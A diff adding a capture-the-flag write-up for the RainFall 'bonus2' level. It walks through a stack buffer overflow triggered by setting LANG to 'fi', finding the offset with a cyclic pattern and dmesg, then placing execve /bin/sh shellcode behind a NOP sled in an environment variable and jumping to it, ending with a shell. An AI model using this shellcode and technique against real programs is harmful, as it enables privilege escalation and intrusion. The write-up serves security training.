@@ -1,3 +1,5 @@
+# bonus2
+
 ```sh
 (gdb) disas main
 Dump of assembler code for function main:
@@ -74,6 +76,111 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-```sh
+first we find how to overflow the buffer inside the `greetuser()`
+we know that there's 2 strncpy cpying from argv[1] and argv[2] with size of 40 and 32 prespectively. So if argv[1] is have at least 40 byte of something. it will overflow into argv[2] buffer creating a argv[1](size 40) + argv[2] payload. and it can cause buffer inside `greetuser()` to overflow. But this only happen when LANG is set to 'fi' or 'nl' since the last option does not result in overflow.
 
+```sh
+bonus2@RainFall:~$ LANG=fi ./bonus2 `python -c "print '\x90' * 40"` Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Hyvää päivää ����������������������������������������Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Segmentation fault (core dumped)
 ```
+
+then using dmesg
+
+```sh
+[...]
+[12191.149357] bonus2[5223]: segfault at 41366141 ip 41366141 sp bffff5c0 error 14
+```
+
+and the offset is 18
+
+so the payload is 
+
+```sh
+./bonus2 `python -c "print '\x90' * 40"` `python -c "print '\x90' * 18 + <address to shell code>"`
+```
+
+with this we will just need to find a place to store our shell code.
+
+env will do
+
+```sh
+export LANG=`python -c "print 'fi' + '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
+```
+
+with is we just need to aim for the address somewhere in the NOP zone.
+
+to find the address of the LANG
+
+```sh
+bonus2@RainFall:~$ export LANG=`python -c "print 'fi' + '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
+bonus2@RainFall:~$ gdb bonus2 
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x804852f
+(gdb) r `python -c "print '\x90' * 40"` AAAA
+Starting program: /home/user/bonus2/bonus2 `python -c "print '\x90' * 40"` AAAA
+
+Breakpoint 1, 0x0804852f in main ()
+(gdb) x/40s *environ
+0xbffff8a4:      "SHELL=/bin/bash"
+0xbffff8b4:      "TERM=xterm-256color"
+0xbffff8c8:      "SSH_CLIENT=10.0.2.15 49510 4242"
+0xbffff8e8:      "SSH_TTY=/dev/pts/0"
+0xbffff8fb:      "USER=bonus2"
+0xbffff907:      "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
+0xbffff9cf:      ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
+0xbffffa97:      "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
+0xbffffb5f:      ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
+0xbffffc27:      "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
+0xbffffcef:      ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
+0xbffffdb7:      ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
+0xbffffe28:      "COLUMNS=155"
+0xbffffe34:      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
+0xbffffe81:      "MAIL=/var/mail/bonus2"
+0xbffffe97:      "_=/usr/bin/gdb"
+0xbffffea6:      "PWD=/home/user/bonus2"
+0xbffffebc:      "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v\315\200"
+0xbfffff3d:      "LINES=77"
+0xbfffff46:      "HOME=/home/user/bonus2"
+0xbfffff5d:      "SHLVL=1"
+0xbfffff65:      "LOGNAME=bonus2"
+0xbfffff74:      "SSH_CONNECTION=10.0.2.15 49510 10.0.2.4 4242"
+0xbfffffa1:      "LESSOPEN=| /usr/bin/lesspipe %s"
+0xbfffffc1:      "LESSCLOSE=/usr/bin/lesspipe %s %s"
+0xbfffffe3:      "/home/user/bonus2/bonus2"
+0xbffffffc:      ""
+0xbffffffd:      ""
+0xbffffffe:      ""
+0xbfffffff:      ""
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+(gdb) 
+```
+
+And its at `0xbffffebc` so adding 50 (0x32) = `0xBFFFFEEE`
+
+```sh
+LANG=`python -c "print 'fi' + '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
+
+./bonus2 `python -c "print '\x90' * 40"` `python -c "print '\x90' * 18 + '\xBF\xFF\xFE\xEE'[::-1]"`
+```
+
+and we got bonus3 shell
